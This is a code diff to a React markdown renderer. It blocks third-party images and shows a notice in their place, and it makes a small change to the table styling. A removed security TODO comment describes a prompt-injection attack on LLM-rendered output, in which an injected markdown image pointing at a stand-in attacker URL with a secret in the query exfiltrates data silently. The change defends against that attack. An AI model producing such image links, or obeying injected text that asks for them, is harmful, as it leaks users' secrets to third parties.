@@ -18,6 +18,7 @@ import { slugifyHeadingText } from '../../../utils/markdown-heading-id';
 import { renderedLinkRel } from '../../../utils/markdown-link';
 import { getHashTargetElement, navigateSamePageHash, HUB_HEADER_OFFSET_PX } from '../../../utils/same-page-hash-nav';
 import { useLoadingScope } from '../loading-scope';
+import { ExternalMediaNotice } from './external-media-notice';
 import { extractText, resolveFallbackHeadingId, useAssignedHeadingIds, useHeadingId } from './heading-ids';
 import { MermaidDiagram } from './mermaid-diagram';
 import type { TextSizeElement } from './text-size';
@@ -366,13 +367,11 @@ export function buildBaseComponents({
     // authed loading for native shells and the 400x400 cap with click-to-
     // expand for full resolution.
     //
-    // TODO(security): LLM-rendered surfaces still auto-load ANY image origin,
-    // so a prompt-injected `![](https://attacker/log?d=<secret>)` exfiltrates
-    // silently. An image-origin allowlist is a tracked follow-up: it requires
-    // a host-supplied origin list threaded from each chat composition (there
-    // is no safe default this library can pick), so it is deliberately absent
-    // rather than shipped unwired.
-    img: ({ src, alt }: MdRenderProps<'img'>) => {
+    // A third-party `src` never reaches here unless the composition set
+    // `allowRemoteMedia`: `rehypeStripUnsafe` moves it to `data-blocked-src`,
+    // and a notice stands where the image would have been. It is not loaded.
+    img: ({ src, alt, 'data-blocked-src': blockedSrc }: MdRenderProps<'img'> & { 'data-blocked-src'?: string }) => {
+      if (hasRenderableSrc(blockedSrc)) return <ExternalMediaNotice url={blockedSrc} kind="image" label={alt} />;
       if (!hasRenderableSrc(src)) return null;
       return <MarkdownContentImage src={src} alt={alt} />;
     },
@@ -411,7 +410,7 @@ export function buildBaseComponents({
     // bottom row's `border-b` used to sit against the frame's own border as a
     // doubled line.
     table: ({ children }: MdRenderProps<'table'>) => (
-      <div className="table-container my-6 overflow-x-auto rounded-lg border border-ods-border bg-ods-card">
+      <div className="my-6 overflow-x-auto rounded-lg border border-ods-border bg-ods-card">
         <table className="w-full table-fixed md:table-auto [&_tr:last-child_td]:border-b-0">{children}</table>
       </div>
     ),
